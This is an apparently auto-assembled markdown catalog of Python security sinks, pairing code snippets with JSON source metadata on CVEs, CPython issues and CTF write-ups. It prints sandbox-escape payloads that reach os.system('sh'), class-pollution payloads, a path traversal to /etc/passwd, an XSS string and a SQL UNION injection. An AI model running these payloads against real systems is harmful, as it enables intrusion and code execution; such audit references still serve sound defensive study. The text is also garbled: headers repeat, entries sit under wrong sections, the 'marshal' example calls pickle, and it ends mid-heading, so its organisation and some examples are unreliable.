# Python Sinks

> **Scope**: This catalog covers well-known Python sinks **and** niche, non-obvious sinks that are frequently ignored in security audits. The latter are annotated with `[NICHE]` and include real CTF references, CVEs, and exploitation caveats.
>
> **Version focus**: Python 3.x unless otherwise noted.

---

## RCE — Well-Known

`os.system()`, `os.popen()`, `subprocess.call/check_call/check_output/run/Popen()`, `exec()`, `eval()`, `compile()`, `__import__('os').system()`, `importlib.import_module()`, `code.InteractiveInterpreter`, `pty.spawn()`

## RCE — Niche / Hidden

### `codeop.compile_command()` — The Hidden `exec` Alternative
**Risk**: Developers block `eval`/`exec` but miss `codeop` since it's lower-level and undocumented. Any sandbox that allows `codeop` is effectively bypassed.

```python
import codeop
cmd = """
[x for x in [].__class__.__base__.__subclasses__()
 if x.__name__ == 'BuiltinImporter'][0].load_module('builtins').exec(
    'import os; os.system("whoami")',
    {'__builtins__': [x for x in [].__class__.__base__.__subclasses__()
                      if x.__name__ == 'BuiltinImporter'][0].load_module('builtins')}
)
"""
compiler = codeop.CommandCompiler()
code = compiler(cmd)
exec(code)
```
**Ref**: Sam Anttila — Breaking Python 3 eval protections.

```json
{
  "sink_id": "RCE-001",
  "category": "RCE",
  "title": "codeop.compile_command() as an indirect exec primitive",
  "severity": "critical",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://netsec.expert/posts/breaking-python3-eval-protections/",
      "title": "Breaking Python 3 eval protections",
      "author": "Sam Anttila",
      "date": "2021-01-16",
      "verified": true,
      "tags": [
        "python",
        "sandbox",
        "eval-bypass",
        "codeop",
        "exec"
      ],
      "archived_path": "sources/RCE-001/netsec.expert_posts_breaking-python3-eval-protections.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `builtins.help()` / `builtins.license()` — Globals Access
**Risk**: `help()` and `license()` are builtins that expose `__globals__` even when `__builtins__` is cleared.

```python
# When __builtins__ is emptied:
help.__globals__["__builtins__"]["__import__"]("os").system("sh")
```
**Ref**: jiegec's pyjail collection.

```json
{
  "sink_id": "RCE-002",
  "category": "RCE",
  "title": "help() and license() globals recovery in restricted runtimes",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://jia.je/ctf-writeups/misc/pyjail/seccon-2024-quals-1linepyjail.html",
      "title": "Seccon 2024 quals 1linepyjail - CTF Writeups by @jiegec",
      "author": "Jiajie Chen",
      "date": "2026-04-27",
      "verified": true,
      "tags": [
        "pyjail",
        "help",
        "license",
        "__globals__",
        "builtins"
      ],
      "archived_path": "sources/RCE-002/jia.je_ctf-writeups_misc_pyjail_seccon-2024-quals-1linepy.md"
    }
  ],
  "confidence": "confirmed"
}
```

---

## Deserialization — Well-Known

`pickle.loads()`, `pickle.load()`, `shelve.open()`, `yaml.load()` (without `Loader=SafeLoader`), `yaml.unsafe_load()`, `jsonpickle.decode()`, `dill.loads()`, `cloudpickle.loads()`, `marshal.loads()`

## Deserialization — Niche / Hidden


## Deserialization — Well-Known

`pickle.loads()`, `pickle.load()`, `shelve.open()`, `yaml.load()` (without `Loader=SafeLoader`), `yaml.unsafe_load()`, `jsonpickle.decode()`, `dill.loads()`, `cloudpickle.loads()`, `marshal.loads()`

## Deserialization — Niche / Hidden

### `marshal` — Crash / RCE Beyond Pickle
**Risk**: Used for `.pyc` files. Malicious marshal payload can cause crashes or code execution. The `allow_code` parameter only partially mitigates.

```python
# DoS via malformed data
hex_string = "8004952A000000000000008C086461746574696D65948C086461746574696D65949388430A07B2010100000000000092059452942E"
myb = bytes.fromhex(hex_string)
f = io.BytesIO(myb)
data = pickle.load(f)  # SIGSEGV
```
**Ref**: CPython Issue #85380, Issue #113626 (algorithmic complexity attack).

```json
{
  "sink_id": "DESER-001",
  "category": "DESER",
  "title": "marshal deserialization of hostile data can crash or destabilize the interpreter",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/85380",
      "title": "An exploitable segmentation fault in marshal module",
      "author": "python/cpython",
      "date": "2020-07-04",
      "gh_issue": "python/cpython#85380",
      "verified": true,
      "tags": [
        "marshal",
        "deserialization",
        "segfault",
        "dos"
      ],
      "archived_path": "sources/DESER-001/github.com_python_cpython_issues_85380.md"
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/113626",
      "title": "Safer data serialization with marshal module",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#113626",
      "verified": true,
      "tags": [
        "marshal",
        "allow_code",
        "algorithmic-complexity",
        "pyc"
      ],
      "archived_path": "sources/DESER-001/github.com_python_cpython_issues_113626.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `copy.deepcopy` + `xml.etree.ElementTree` — UAF / Stack Overflow
**Risk**: Deeply nested XML + deepcopy causes SIGSEGV. Re-entrant `__deepcopy__` can trigger UAF.

```python
import xml.etree.ElementTree as ET
import copy

# SIGSEGV — unbounded C recursion
root = ET.Element("r")
cur = root
for i in range(500_000):
    c = ET.Element("n")
    cur.append(c)
    cur = c
copy.deepcopy(root)
```
**Ref**: CPython Issue #148801 (2026), Issue #133009 (UAF).

```json
{
  "sink_id": "DESER-002",
  "category": "DESER",
  "title": "deepcopy on ElementTree objects can trigger UAF or unbounded C recursion",
  "severity": "high",
  "affected_versions": [
    "3.13+",
    "3.14+",
    "3.15-dev"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/148801",
      "title": "Unbounded C recursion in `_elementtree.Element.__deepcopy__` causes causes stack overflow",
      "author": "python/cpython",
      "date": "2026-04-20",
      "gh_issue": "python/cpython#148801",
      "verified": true,
      "tags": [
        "elementtree",
        "deepcopy",
        "stack-overflow",
        "segfault"
      ],
      "archived_path": "sources/DESER-002/github.com_python_cpython_issues_148801.md"
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/133009",
      "title": "UAF: `xml.etree.ElementTree.Element.__deepcopy__` when concurrent mutations happen",
      "author": "python/cpython",
      "date": "2025-04-26",
      "gh_issue": "python/cpython#133009",
      "verified": true,
      "tags": [
        "elementtree",
        "deepcopy",
        "uaf",
        "memory-corruption"
      ],
      "archived_path": "sources/DESER-002/github.com_python_cpython_issues_133009.md"
    }
  ],
  "confidence": "confirmed"
}
```

---

## SSTI — Well-Known

`jinja2.Template(user_input).render()`, `mako.template.Template(user_input).render()`, `tornado.template.Template(user_input).generate()`, `django.template.Template(user_input)`

## SSTI — Niche / Hidden


### Pickle `BUILD` Opcode UAF (gh-143638, 2026)
**Risk**: Re-entrant `__setitem__` during unpickling clears the stack, dropping the instance under construction.

```json
{
  "sink_id": "DESER-003",
  "category": "DESER",
  "title": "Pickle BUILD opcode UAF via re-entrant __setitem__ during object construction",
  "severity": "critical",
  "affected_versions": [
    "3.14-dev"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143638",
      "title": "Pickle BUILD Opcode UAF",
      "author": "python/cpython",
      "date": "2026-01-01",
      "gh_issue": "python/cpython#143638",
      "verified": false,
      "tags": [
        "pickle",
        "deserialization",
        "uaf",
        "re-entrancy"
      ],
      "archived_path": "sources/DESER-003/github.com_python_cpython_issues_143638.md"
    }
  ],
  "related_issues": [
    "python/cpython#143638"
  ],
  "mitigation": "Do not allow container mutation callbacks to run while pickle BUILD operates on in-construction instances.",
  "confidence": "likely"
}
```


## SSTI — Well-Known

`jinja2.Template(user_input).render()`, `mako.template.Template(user_input).render()`, `tornado.template.Template(user_input).generate()`, `django.template.Template(user_input)`

## SSTI — Niche / Hidden

### Jinja2 `|safe` Filter on Tainted Data
**Risk**: Marking user input as "safe" bypasses auto-escaping. Also applies to Django `mark_safe()`, `markupsafe.Markup()`.

```python
from markupsafe import Markup
user_input = "<script>alert(1)</script>"
Markup(user_input)  # XSS if rendered in template
```

```json
{
  "sink_id": "SSTI-001",
  "category": "SSTI",
  "title": "Jinja2 safe-marking helpers disable escaping on tainted input",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://jinja.palletsprojects.com/en/stable/templates/#jinja-filters.safe",
      "title": "Jinja Template Designer Documentation — safe",
      "author": "Pallets",
      "date": "2025-06-12",
      "verified": true,
      "tags": [
        "jinja2",
        "safe-filter",
        "xss",
        "autoescape"
      ],
      "archived_path": "sources/SSTI-001/jinja.palletsprojects.com_en_stable_templates.md"
    },
    {
      "type": "blog_post",
      "url": "https://markupsafe.palletsprojects.com/en/stable/escaping/#markupsafe.Markup",
      "title": "MarkupSafe — Working With Safe Text",
      "author": "Pallets",
      "date": "2025-09-27",
      "verified": true,
      "tags": [
        "markupsafe",
        "markup",
        "xss",
        "html-escaping"
      ],
      "archived_path": "sources/SSTI-001/markupsafe.palletsprojects.com_en_stable_escaping.md"
    }
  ],
  "confidence": "confirmed"
}
```

---

## File Operations — Well-Known

`open()`, `os.path.*`, `shutil.*`, `tempfile.*`, `zipfile.extractall()` (zip slip), `tarfile.extractall()` (tar slip), `os.symlink()`, `pathlib.Path`

## File Operations — Niche / Hidden


## File Operations — Well-Known

`open()`, `os.path.*`, `shutil.*`, `tempfile.*`, `zipfile.extractall()` (zip slip), `tarfile.extractall()` (tar slip), `os.symlink()`, `pathlib.Path`

## File Operations — Niche / Hidden

### `shutil.move` Non-Atomic Fallback
**Risk**: Falls back to `copy+remove` if `os.rename` fails — silently, without warning. Creates a race window.

```python
if not os.path.exists(dst):  # CHECK
    shutil.move(src, dst)    # USE — may overwrite attacker-created file
```
**Ref**: CPython Issue #109503.

```json
{
  "sink_id": "FILE-001",
  "category": "FILE",
  "title": "shutil.move silently degrades from rename to copy+remove",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/109503",
      "title": "Inaccurate and misleading document for shutil.move in case src/target are on the same filesystem",
      "author": "python/cpython",
      "date": "2023-09-17",
      "gh_issue": "python/cpython#109503",
      "verified": true,
      "tags": [
        "shutil",
        "move",
        "race-condition",
        "non-atomic"
      ],
      "archived_path": "sources/FILE-001/github.com_python_cpython_issues_109503.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `tempfile.mktemp` Race (CWE-377)
**Risk**: Generates a filename without creating the file atomically. Attacker can create a symlink at that path.

```python
filename = tempfile.mktemp(suffix='', prefix='tmp', dir='/tmp')
# RACE WINDOW
with open(filename, 'w') as f:  # May follow symlink!
    f.write("sensitive data")
```
**Ref**: Python Issue 43604.

```json
{
  "sink_id": "FILE-002",
  "category": "FILE",
  "title": "tempfile.mktemp returns a path without atomic creation",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "cpython_issue",
      "url": "https://bugs.python.org/issue43604",
      "title": "Issue 43604: Fix tempfile.mktemp()",
      "author": "Python Software Foundation",
      "date": "2021-03-23",
      "verified": true,
      "tags": [
        "tempfile",
        "mktemp",
        "cwe-377",
        "symlink-race"
      ],
      "archived_path": "sources/FILE-002/bugs.python.org_issue43604.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `TarFile.extractall(..., filter='tar')` — Symlink-Based Arbitrary chmod
**Risk**: Despite the `filter` security feature, `filter='tar'` can chmod files outside the extraction directory via symlink + deferred chmod interaction.

```python
# Tar structure:
#   x -> ../../../../target (symlink)
#   x/..data
# After extraction: deferred chmod runs on 'x', resolving to arbitrary file
```
**Ref**: CPython Issue #127987.

```json
{
  "sink_id": "FILE-003",
  "category": "FILE",
  "title": "TarFile.extractall filter='tar' can chmod arbitrary files via symlink rewriting",
  "severity": "high",
  "affected_versions": [
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+",
    "3.14+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/127987",
      "title": "TarFile.extractall(..., filter='tar') arbitrary file chmod",
      "author": "python/cpython",
      "date": "2024-12-16",
      "gh_issue": "python/cpython#127987",
      "verified": true,
      "tags": [
        "tarfile",
        "symlink",
        "chmod",
        "path-traversal"
      ],
      "archived_path": "sources/FILE-003/github.com_python_cpython_issues_127987.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `pkgutil.get_data()` — Path Traversal (CVE-2026-3479)
**Risk**: Documented restrictions are not enforced, allowing path traversal outside package.

```python
import pkgutil
data = pkgutil.get_data('package', '../../../etc/passwd')
```
**Ref**: CPython Issue #146121. Fixed in Python 3.15.

```json
{
  "sink_id": "FILE-004",
  "category": "FILE",
  "title": "pkgutil.get_data() resource argument traversal escapes package boundaries",
  "severity": "high",
  "affected_versions": [
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+",
    "3.14+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/146121",
      "title": "[CVE-2026-3479] Documented `pkgutil.get_data()` restrictions are not enforced",
      "author": "python/cpython",
      "date": "2026-03-18",
      "cve_id": "CVE-2026-3479",
      "gh_issue": "python/cpython#146121",
      "verified": true,
      "tags": [
        "pkgutil",
        "path-traversal",
        "resource-loading",
        "cve"
      ],
      "archived_path": "sources/FILE-004/github.com_python_cpython_issues_146121.md"
    }
  ],
  "confidence": "confirmed"
}
```

---

## SSRF — Well-Known

`requests.get/post()`, `urllib.request.urlopen()`, `http.client.HTTPConnection`, `httpx`, `aiohttp.ClientSession`, `urllib3`

## SSRF — Niche / Hidden


### `tempfile.TemporaryDirectory` Symlink Dereference (CVE-2023-6597)
**Risk**: Cleanup dereferences symlinks, potentially chmodding files outside the temp directory.

```json
{
  "sink_id": "FILE-005",
  "category": "FILE",
  "title": "`TemporaryDirectory` Cleanup Symlink Dereference",
  "severity": "medium",
  "affected_versions": [
    "3.8",
    "3.9",
    "3.10",
    "3.11",
    "3.12"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6597",
      "title": "CVE-2023-6597: tempfile.TemporaryDirectory symlink dereference during cleanup",
      "author": "NVD",
      "date": "2024-01-18",
      "cve_id": "CVE-2023-6597",
      "verified": false,
      "tags": [
        "tempfile",
        "symlink",
        "cleanup",
        "filesystem"
      ],
      "archived_path": "sources/FILE-005/nvd.nist.gov_vuln_detail_CVE-2023-6597.md"
    }
  ],
  "related_cves": [
    "CVE-2023-6597"
  ],
  "related_issues": [],
  "mitigation": "Upgrade to a patched CPython release and avoid cleanup on attacker-controlled directory trees.",
  "confidence": "confirmed"
}
```

---

## Async / Generator Sinks


### `os.path.commonprefix` — Deprecated Due to Security
**Risk**: Returns common prefix character-by-character, not path-aware. Used insecurely in tarfile filters.

```python
os.path.commonprefix(['/home/user/file', '/home/user/subdir'])
# Returns '/home/user/s' — not a valid path!
```
**Ref**: Seth Larson deprecation proposal.

```json
{
  "sink_id": "FILE-006",
  "category": "FILE",
  "title": "`os.path.commonprefix` Path Validation Footgun",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://sethmlarson.dev/security/deprecating-os-path-commonprefix-python-3-13",
      "title": "Deprecating os.path.commonprefix in Python 3.13 for security reasons",
      "author": "Seth Michael Larson",
      "date": "2024-06-01",
      "verified": false,
      "tags": [
        "commonprefix",
        "path-traversal",
        "tarfile",
        "deprecation"
      ],
      "archived_path": "sources/FILE-006/sethmlarson.dev_security_deprecating-os-path-commonprefix-python-3.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Use os.path.commonpath or canonicalized path comparisons instead of commonprefix.",
  "confidence": "likely"
}
```


## SSRF — Well-Known

`requests.get/post()`, `urllib.request.urlopen()`, `http.client.HTTPConnection`, `httpx`, `aiohttp.ClientSession`, `urllib3`

## SSRF — Niche / Hidden

### `urllib.parse` — Multiple CVEs
**Risk**: URL parsing edge cases bypass SSRF filters, cause CRLF injection, or cache poisoning.

```python
from urllib.parse import urlparse

# CVE-2023-24329: Space bypass
urlparse("  http://evil.com/")  # Still parses as 'evil.com'

# CVE-2024-11168: Bracketed host bypass
urlparse("http://[localhost]/")

# CVE-2022-0391: CRLF injection
urlsplit("http://example.com/%0D%0AHELO%20evil.com%0D%0A")

# CVE-2021-23336: Semicolon separator cache poisoning
parse_qsl("a=1;b=2&c=3")
```
**Refs**: VU#127587, Python Issue #88048, AppSecure, Python Issue #87133.

```json
{
  "sink_id": "SSRF-001",
  "category": "SSRF",
  "title": "urllib.parse edge cases undermine SSRF and URL validation logic",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "security_advisory",
      "url": "https://www.kb.cert.org/vuls/id/127587",
      "title": "VU#127587 - Python Parsing Error Enabling Bypass CVE-2023-24329",
      "author": "CERT Coordination Center",
      "date": "2023-08-11",
      "cve_id": "CVE-2023-24329",
      "verified": true,
      "tags": [
        "urllib.parse",
        "ssrf",
        "crlf",
        "cache-poisoning",
        "url-parse"
      ],
      "archived_path": "sources/SSRF-001/www.kb.cert.org_vuls_id_127587.md"
    }
  ],
  "confidence": "likely"
}
```

---

## SQLi — Well-Known

`cursor.execute(f"...")`, `sqlalchemy.text()`, Django `raw()`, `extra()`, `RawSQL()`

## SQLi — Niche / Hidden


## SQLi — Well-Known

`cursor.execute(f"...")`, `sqlalchemy.text()`, Django `raw()`, `extra()`, `RawSQL()`

## SQLi — Niche / Hidden

### `sqlite3` Table Name Injection
**Risk**: SQLite3 supports parameterization for VALUES but NOT for table/column names.

```python
import sqlite3
# WRONG — SQL injection possible
conn.execute(f"SELECT * FROM {user_input}")

# Bracket escaping bypass
malicious_name = "users] UNION SELECT password FROM users--"
query = f"SELECT * FROM [{malicious_name}]"
# Parses as: SELECT * FROM [users] UNION SELECT password FROM users--
```
**Ref**: Python Issue #11685, Datasette Advisory.

```json
{
  "sink_id": "SQLI-001",
  "category": "SQLI",
  "title": "sqlite3 identifier interpolation enables table-name SQL injection",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/library/sqlite3.html",
      "title": "sqlite3 — DB-API 2.0 interface for SQLite databases",
      "author": "Python Software Foundation",
      "date": "2026-04-28",
      "verified": true,
      "tags": [
        "sqlite3",
        "sqli",
        "identifier-injection",
        "db-api"
      ],
      "archived_path": "sources/SQLI-001/docs.python.org_3_library_sqlite3.html.md"
    }
  ],
  "confidence": "confirmed"
}
```

---

## Class Confusion / Type System Sinks


## Class Confusion / Type System Sinks

### Class Pollution via `__class__.__init__.__globals__`
**Risk**: Python's equivalent of JavaScript prototype pollution. Recursive merge functions that call `setattr` on user-controlled input allow mutating any global variable.

```python
def set_(dst, src):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                set_(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            set_(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

payload = {
    "__class__": {
        "__init__": {
            "__globals__": {
                "session": {"user": "witch"}
            }
        }
    }
}
set_(session, payload)
```
**Refs**: Bauhinia CTF 2023, idekCTF 2022, DownUnderCTF 2024.

```json
{
  "sink_id": "CLASS-001",
  "category": "CLASS",
  "title": "Class Pollution via __class__.__init__.__globals__",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://blog.abdulrah33m.com/prototype-pollution-in-python/",
      "title": "Prototype Pollution in Python",
      "author": "Abdulrah33m",
      "date": "2023-08-23",
      "verified": true,
      "tags": [
        "class-pollution",
        "prototype-pollution",
        "setattr",
        "__globals__",
        "ctf"
      ],
      "archived_path": "sources/CLASS-001/blog.abdulrah33m.com_prototype-pollution-in-python.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `__init_subclass__` Hook Abuse
**Risk**: Executes automatically when any class inherits from a class defining it. Bypasses sandboxes that block `ast.Call` but allow class definitions.

```python
class LegitimateParent:
    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        import os; os.system('whoami')

class Payload(LegitimateParent):
    pass  # Triggers hook immediately
```
**Refs**: UIUCTF 2024 "ASTea", Langflow CVE-2025-3248.

```json
{
  "sink_id": "CLASS-002",
  "category": "CLASS",
  "title": "__init_subclass__ Hook Abuse",
  "severity": "high",
  "affected_versions": [
    "3.6+"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__init_subclass__",
      "title": "3. Data model — object.__init_subclass__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": false,
      "tags": [
        "__init_subclass__",
        "class-definition",
        "sandbox-bypass",
        "ctf"
      ],
      "archived_path": "sources/CLASS-002/docs.python.org_3_reference_datamodel.html.md"
    }
  ],
  "confidence": "likely"
}
```


### `__class_getitem__` Fallback to Metaclass
**Risk**: CPython falls back to the metaclass's `__class_getitem__` even when the class already defines its own.

```python
class Meta(type):
    def __class_getitem__(cls, key):
        return f'meta got {key!r}'

class Ham(metaclass=Meta):
    pass

Ham[10]  # "meta got 10" — unexpected fallback
```
**Ref**: CPython Issue #122634.

```json
{
  "sink_id": "CLASS-003",
  "category": "CLASS",
  "title": "__class_getitem__ Fallback to Metaclass",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/122634",
      "title": "Class subscription falls back to metaclass __class_getitem__ unexpectedly",
      "author": "python/cpython",
      "date": "2024-08-01",
      "gh_issue": "python/cpython#122634",
      "verified": false,
      "tags": [
        "cpython",
        "metaclass",
        "__class_getitem__",
        "subscription"
      ],
      "archived_path": "sources/CLASS-003/github.com_python_cpython_issues_122634.md"
    }
  ],
  "confidence": "likely"
}
```


### Metaclass `__getitem__` = exec
**Risk**: Class subscription `Class['code']` triggers `__getitem__` without an `ast.Call` node.

```python
class Metaclass(type):
    __getitem__ = exec

class Sub(metaclass=Metaclass):
    pass

Sub['import os; os.system("sh")']  # RCE!
```
**Refs**: b01lers CTF 2023 "ez-class", BuckeyeCTF 2024 "gentleman".

```json
{
  "sink_id": "CLASS-004",
  "category": "CLASS",
  "title": "Metaclass __getitem__ Execution Sink",
  "severity": "critical",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__getitem__",
      "title": "3. Data model — object.__getitem__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": [
        "metaclass",
        "__getitem__",
        "exec",
        "ast-bypass",
        "ctf"
      ],
      "archived_path": "sources/CLASS-004/docs.python.org_3_reference_datamodel.html.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `type.__getattribute__` Trampoline — AST Bypass
**Risk**: AST filters blocking `ast.Attribute` miss string-based attribute access via `type.__getattribute__`.

```python
type.__getattribute__(
    type.__getattribute__(obj, "__class__"),
    "__subclasses__"
)()[X].__init__.__globals__['os'].system('sh')
```
**Ref**: PraisonAI CVE-2026-40158.

```json
{
  "sink_id": "CLASS-005",
  "category": "CLASS",
  "title": "type.__getattribute__ Trampoline AST Bypass",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__getattribute__",
      "title": "3. Data model — object.__getattribute__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": false,
      "tags": [
        "__getattribute__",
        "attribute-bypass",
        "ast-bypass",
        "sandbox-escape"
      ],
      "archived_path": "sources/CLASS-005/docs.python.org_3_reference_datamodel.html.md"
    }
  ],
  "confidence": "likely"
}
```


### `__kwdefaults__` Pollution
**Risk**: Overwriting function keyword-only parameter defaults via class pollution.

```python
def execute(command):
    print(f"Executing {command}")

payload = {
    '__class__': {
        '__init__': {
            '__globals__': {
                'execute': {
                    '__kwdefaults__': {'command': 'echo HACKED'}
                }
            }
        }
    }
}
```
**Refs**: idekCTF 2022, YesWeHack Dojo #32.

```json
{
  "sink_id": "CLASS-006",
  "category": "CLASS",
  "title": "Function __kwdefaults__ Pollution",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://blog.abdulrah33m.com/prototype-pollution-in-python/",
      "title": "Prototype Pollution in Python",
      "author": "Abdulrah33m",
      "date": "2023-08-23",
      "verified": true,
      "tags": [
        "__kwdefaults__",
        "class-pollution",
        "function-defaults",
        "ctf"
      ],
      "archived_path": "sources/CLASS-001/blog.abdulrah33m.com_prototype-pollution-in-python.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `isinstance` Fast-Path Bypass
**Risk**: Python's `isinstance()` has a fast path: if `type(instance) is cls`, it immediately returns `True` **without** calling custom `__instancecheck__`.

```python
class Meta(type):
    def __instancecheck__(cls, instance):
        return False

class Target(metaclass=Meta):
    pass

t = Target()
isinstance(t, Target)  # May short-circuit despite __instancecheck__ returning False
```
**Refs**: CPython Issue #46578, Issue #144873.

```json
{
  "sink_id": "CLASS-007",
  "category": "CLASS",
  "title": "isinstance Fast-Path Bypass",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/46578",
      "title": "isinstance bypasses __instancecheck__ on exact type matches",
      "author": "python/cpython",
      "date": "2022-01-27",
      "gh_issue": "python/cpython#46578",
      "verified": false,
      "tags": [
        "isinstance",
        "__instancecheck__",
        "fast-path",
        "cpython"
      ],
      "archived_path": "sources/CLASS-007/github.com_python_cpython_issues_46578.md"
    }
  ],
  "confidence": "likely"
}
```


### ABC `_abc_cache` Corruption
**Risk**: Bogus `__subclasses__` on an ABC breaks `isinstance` checks for **other** ABCs in the same session.

```python
import abc
class EvilABC(abc.ABC):
    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        cls.__subclasses__ = lambda: ...  # Returns ellipsis
```
**Ref**: CPython Issue #117255.

```json
{
  "sink_id": "CLASS-008",
  "category": "CLASS",
  "title": "ABC _abc_cache Corruption via __subclasses__ Override",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/117255",
      "title": "ABC cache corruption from invalid __subclasses__ behavior",
      "author": "python/cpython",
      "date": "2024-04-08",
      "gh_issue": "python/cpython#117255",
      "verified": false,
      "tags": [
        "abc",
        "_abc_cache",
        "__subclasses__",
        "isinstance",
        "cpython"
      ],
      "archived_path": "sources/CLASS-008/github.com_python_cpython_issues_117255.md"
    }
  ],
  "confidence": "likely"
}
```


### `register()` Virtual Subclass Bypass
**Risk**: `ABCMeta.register()` creates virtual subclasses that pass `isinstance()` without implementing abstract methods.

```python
import abc
class Incomplete(abc.ABC):
    @abc.abstractmethod
    def critical_method(self): pass

class BadClass:
    pass

Incomplete.register(BadClass)
isinstance(BadClass(), Incomplete)  # True!
```
**Ref**: CPython Issue #66677.

```json
{
  "sink_id": "CLASS-009",
  "category": "CLASS",
  "title": "ABCMeta.register Virtual Subclass Bypass",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/66677",
      "title": "Virtual subclass registration bypasses abstract interface guarantees",
      "author": "python/cpython",
      "date": "2015-06-08",
      "gh_issue": "python/cpython#66677",
      "verified": false,
      "tags": [
        "abc",
        "register",
        "virtual-subclass",
        "abstractmethod",
        "cpython"
      ],
      "archived_path": "sources/CLASS-009/github.com_python_cpython_issues_66677.md"
    }
  ],
  "confidence": "likely"
}
```

---

## Prototype / Property Injection Sinks


### RestrictedPython Bypass via `try/except*` (CVE-2025-22153, 2025)
**Risk**: Type confusion in CPython's exception group handling bypasses sandbox restrictions.

```json
{
  "sink_id": "CLASS-010",
  "category": "CLASS",
  "title": "RestrictedPython sandbox bypass via try/except* exception-group type confusion",
  "severity": "high",
  "affected_versions": [
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-22153",
      "title": "CVE-2025-22153",
      "author": "NVD",
      "date": "2025-01-01",
      "cve_id": "CVE-2025-22153",
      "verified": false,
      "tags": [
        "restrictedpython",
        "sandbox-bypass",
        "exception-groups",
        "type-confusion"
      ],
      "archived_path": "sources/CLASS-010/nvd.nist.gov_vuln_detail_CVE-2025-22153.md"
    }
  ],
  "related_cves": [
    "CVE-2025-22153"
  ],
  "mitigation": "Treat exception-group control flow as a separate audit surface and avoid assuming AST-level filters cover except* semantics.",
  "confidence": "likely"
}
```


## Prototype / Property Injection Sinks

### `object.__setattr__` Bypass
**Risk**: Custom `__setattr__` implementations can be bypassed by calling `object.__setattr__` directly.

```python
class Foo(object):
    def __setattr__(self, attr, value):
        pass

f = Foo()
object.__setattr__(f, '__class__', Bar)  # Bypasses custom __setattr__
```
**Ref**: BalsnCTF pyshv3.

```json
{
  "sink_id": "PROTO-001",
  "category": "PROTO",
  "title": "object.__setattr__ Bypass",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__setattr__",
      "title": "3. Data model — object.__setattr__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": [
        "object.__setattr__",
        "attribute-bypass",
        "pyjail",
        "ctf"
      ],
      "archived_path": "sources/PROTO-001/docs.python.org_3_reference_datamodel.html.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `getattr`/`setattr` Hook Bypass (Lupa CVE-2026-34444)
